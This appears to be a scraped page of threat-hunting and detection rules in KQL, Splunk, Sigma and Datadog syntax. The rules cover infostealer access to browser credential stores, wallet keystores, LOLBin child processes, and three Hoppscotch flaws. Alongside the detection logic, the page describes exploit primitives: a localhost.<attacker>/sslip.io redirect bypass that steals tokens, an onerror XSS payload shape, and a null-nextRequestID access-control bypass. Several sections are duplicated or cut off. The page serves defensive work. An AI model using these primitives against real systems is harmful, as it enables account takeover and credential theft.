| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("") or RemoteUrl has_any ("github.com/ColossusQuailPray/oiegjqde")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic([""]);
let BadDomains = dynamic(["github.com/ColossusQuailPray/oiegjqde"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

description: |

            - '__DOMAIN_PLACEHOLDER_1__'
            - '__DOMAIN_PLACEHOLDER_2__'

falsepositives:

level: critical

Suspicious browser extension installation Installation Medium
Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.
ATT&CKT1176
Data sourcesEndpoint.Registry DeviceRegistryEvents
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where RegistryKey has_any ("\Software\Google\Chrome\Extensions\","\Software\Microsoft\Edge\Extensions\","\Software\Mozilla\Firefox\Extensions\")
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, InitiatingProcessAccountName
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where RegistryKey has_any (@"\Software\Google\Chrome\Extensions\",
                              @"\Software\Microsoft\Edge\Extensions\",
                              @"\Software\Mozilla\Firefox\Extensions\")
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
          RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`

title: Crypto-Wallet Keystore Access by Non-Wallet Process
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d02
status: experimental
description: |
    Stealers / wallet drainers read keystore files from MetaMask,
    Exodus, Atomic, Phantom, Bitcoin, Electrum, Ethereum-cli wallets.
    Filtering out the legitimate wallet binaries leaves only attacker
    activity.
references:
    - https://attack.mitre.org/techniques/T1005/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1005
    - attack.collection
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Ethereum\keystore\'
            - '\Bitcoin\'
            - '\Exodus\'
            - '\Electrum\wallets\'
            - '\MetaMask\'
            - '\Phantom\'
            - '\Atomic\Local Storage\'
    filter_legit:
        Image|endswith:
            - '\MetaMask.exe'
            - '\Exodus.exe'
            - '\Atomic.exe'
            - '\electrum.exe'
            - '\Bitcoin.exe'
            - '\Phantom.exe'

falsepositives:

        OR Filesystem.file_path="*\MetaMask\*"
        OR Filesystem.file_path="*\Phantom\*"
        OR Filesystem.file_path="*\Atomic\Local Storage\*")
      AND NOT Filesystem.process_name IN ("MetaMask.exe","Exodus.exe","Atomic.exe","electrum.exe","Bitcoin.exe","Phantom.exe")

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44") or SHA1 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44") or MD5 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44") or SHA1 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44") or MD5 in~ ("2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["2819ea44e22b9c47049e86894e544f3fd0de1d8afc7b545314bd3bc718bf2e02", "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Aikido’s AI pentesting agents discovered multiple high-severity vulnerabilities in Hoppscotch, including account takeover, stored XSS, and access control flaws. All issues are now patched. Category: Vulnerabilities & Threats

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Hoppscotch device-login open redirect token theft via localhost.* / sslip.io bypass · [LLM] Hoppscotch Mock Server stored XSS via GraphQL updateRESTUserRequest content-type override · [LLM] Hoppscotch cross-team request injection via moveRequest GraphQL with null nextRequestID · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs
[LLM] Hoppscotch device-login open redirect token theft via localhost.* / sslip.io bypass Exploitation High
Hunts requests to Hoppscotch's /device-login endpoint where the redirect_uri parameter abuses the flawed startsWith('http://localhost') validation by using localhost.<attacker-domain> or localhost.<ip>.sslip.io to exfiltrate session tokens. Detects GHSA-7fg7-wx5q-6m3v exploitation in versions <= 2026.2.1. Rationale: Anchored on the exact bypass primitives the article documents: redirect_uri=http://localhost.<attacker>/ and the sslip.io payload (http://localhost.<attacker-ip>.sslip.io/) the Aikido agents used to verify the flaw. The startsWith('http://localhost') check passes any subdomain of an attacker-controlled domain — these two substrings are the highest-fidelity signal because legitimate device-login uses bare http://localhost/device-token. Cross-referenced GHSA-7fg7-wx5q-6m3v and PR #6012. Cross-checked against: • https://github.com/hoppscotch/hoppscotch/pull/6012 • https://intel.aikido.dev/cve/AIKIDO-2026-10462
ATT&CKT1539 T1190 T1566.002
Data sourcesWeb.Web
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl contains "/device-login"
| where RemoteUrl contains "redirect_uri"
| where RemoteUrl contains "localhost." or RemoteUrl contains "sslip.io"
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","safari.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort
W3CIISLog
| where TimeGenerated > ago(7d)
| where csUriStem contains "/device-login"
| where csUriQuery contains "redirect_uri"
| where csUriQuery contains "localhost." or csUriQuery contains "sslip.io"
| project TimeGenerated, Computer, cIP, csMethod, csUriStem, csUriQuery, csUserAgent, csUserName, scStatus
title: Hoppscotch device-login open redirect token theft
id: 7a4b3c2d-1e5f-4a6b-9c8d-0e1f2a3b4c5d
description: Detects requests to Hoppscotch /device-login with redirect_uri pointing to localhost.* subdomains or sslip.io patterns, exploiting GHSA-7fg7-wx5q-6m3v in versions <= 2026.2.1.
references:
  - https://www.aikido.dev/blog/ai-pentest-hoppscotch-vulnerabilities
  - https://intel.aikido.dev/cve/AIKIDO-2026-10462
  - https://github.com/hoppscotch/hoppscotch/pull/6012
author: SOC Detection Engineering
date: 2026/04/08
tags:
  - attack.credential_access
  - attack.t1539
  - attack.t1190
logsource:
  category: webserver
detection:
  selection_path:
    cs-uri-stem|contains: '/device-login'
  selection_query:
    cs-uri-query|contains: 'redirect_uri'
  selection_payload:
    cs-uri-query|contains:
      - 'localhost.'
      - 'sslip.io'
  condition: selection_path and selection_query and selection_payload
falsepositives:
  - Internal developers testing the redirect flow with intentionally crafted URIs
level: high
source:nginx @http.url:*device-login* @http.url:*redirect_uri* (@http.url:*localhost.* OR @http.url:*sslip.io*)

| ContextImageFileName=/(chrome|msedge|firefox|brave|safari|opera)\.exe$/i
| DomainName=/(^localhost\.[a-z0-9\-]+|\.sslip\.io$)/i
| groupBy([aid, ComputerName, ContextImageFileName, DomainName], function=count())
WEB

| convert ctime(firstTime) ctime(lastTime)
| table firstTime, lastTime, src, user, dest, url, http_user_agent, count
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Web where Web.url="*/device-login*" Web.url="*redirect_uri*" (Web.url="*localhost.*" OR Web.url="*sslip.io*") by Web.src Web.dest Web.url Web.user Web.http_user_agent
| `drop_dm_object_name(Web)`

| convert ctime(firstTime) ctime(lastTime)
| table firstTime, lastTime, src, user, dest, url, http_user_agent, count
[LLM] Hoppscotch Mock Server stored XSS via GraphQL updateRESTUserRequest content-type override Exploitation Medium
Hunts GraphQL traffic invoking the updateRESTUserRequest mutation with a response body that sets Content-Type:text/html and embeds script-bearing markup, then correlates with subsequent GET requests to /mock/<subdomain>/ from the same client. Detects GHSA-wj4r-hr4h-g98v exploitation against versions <= 2026.2.1. Rationale: Targets the exact mutation name the article cites (updateRESTUserRequest) plus the malicious payload shape — a response header object with key:content-type and value:text/html paired with an XSS-bearing body (<img src=x onerror=...>). The Sentinel query uses a same-source-IP correlation between a /graphql POST and a subsequent /mock/ GET because Hoppscotch's mock URLs sit at /mock/<subdomain>/ and rendering them is what triggers the planted script. WAF body inspection (Datadog @http.body) gives the cleanest single-event signal. Cross-referenced GHSA-wj4r-hr4h-g98v and PR #6006. Cross-checked against: • https://github.com/hoppscotch/hoppscotch/pull/6006 • https://intel.aikido.dev/cve/AIKIDO-2026-10463
ATT&CKT1059.007 T1190 T1185
Data sourcesWeb.Web

    | where Timestamp > ago(7d)
    | where RemoteUrl contains "/graphql"
    | where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","curl.exe","python.exe","node.exe")
    | project GraphqlTime=Timestamp, DeviceId, InitiatingProcessAccountName, GraphqlUrl=RemoteUrl;
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl contains "/mock/"
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","safari.exe")
| join kind=inner GraphqlPosts on DeviceId
| where Timestamp between (GraphqlTime .. GraphqlTime + 24h)
| project Timestamp, GraphqlTime, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, MockUrl=RemoteUrl, GraphqlUrl

[LLM] Hoppscotch cross-team request injection via moveRequest GraphQL with null nextRequestID Exploitation Medium
Hunts GraphQL POSTs invoking the MoveTeamRequest mutation where the nextRequestID variable is null and the destCollID belongs to a team the actor is not a member of, exploiting the missing GqlCollectionTeamMemberGuard check. Targets GHSA-wj4r-hr4h-g98v exploitation in versions <= 2026.2.1. Rationale: Anchored on the verbatim operationName (MoveTeamRequest) and the precise exploit primitive the article documents — variables.next set to null while destCollID points to a victim team's collection. The article calls out that nextRequestID:null causes the backend to skip the destination team check, so the null literal is the high-fidelity signal. Detection requires HTTP body capture; Sentinel uses CommonSecurityLog.Message (the WAF body sink) and Datadog uses @http.body. EDR (Defender DeviceProcessEvents, Falcon FDR) doesn't see GraphQL payloads so those slots are intentionally empty. Cross-referenced GHSA-wj4r-hr4h-g98v. Cross-checked against: • https://intel.aikido.dev/cve/AIKIDO-2026-10461
ATT&CKT1190 T1213 T1199
Data sourcesWeb.Web
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestURL contains "/graphql"
| where RequestMethod == "POST"
| where Message contains "MoveTeamRequest" or Message contains "moveRequest"
| where Message contains "nextRequestID" or Message contains "\"next\":null"
| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, SourceUserName, DestinationHostName, RequestURL, RequestMethod, RequestClientApplication, Message
source:nginx @http.method:POST @http.url:*/graphql* @http.body:(*MoveTeamRequest* OR *moveRequest*) @http.body:*destCollID* @http.body:(*"next":null* OR *nextRequestID*)
WEB
index=* (sourcetype=nginx:plus:access OR sourcetype=hoppscotch:* OR sourcetype=waf:*)
  uri_path="*/graphql*" http_method=POST
  ("MoveTeamRequest" OR "moveRequest")
  "nextRequestID" "null"
  destCollID
| rex field=_raw "\"req\"\s*:\s*\"(?<reqId>[^\"]+)\""
| rex field=_raw "\"dest\"\s*:\s*\"(?<destCollId>[^\"]+)\""
| rex field=_raw "\"next\"\s*:\s*(?<nextVal>null|\"[^\"]*\")"
| where nextVal="null"
| stats count, values(reqId) as movedRequestIds, values(destCollId) as destCollIds, dc(destCollId) as uniqueDests, earliest(_time) as first, latest(_time) as last by src, user
| where count >= 1

        TargetFilename|contains:

            - '\Bitcoin\'

            - '\Electrum\wallets\'

            - '\Exodus.exe'

            - '\Bitcoin.exe'

falsepositives:
    - Backup software

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003

| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.

                                  @"\Microsoft\Edge\User Data\",

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
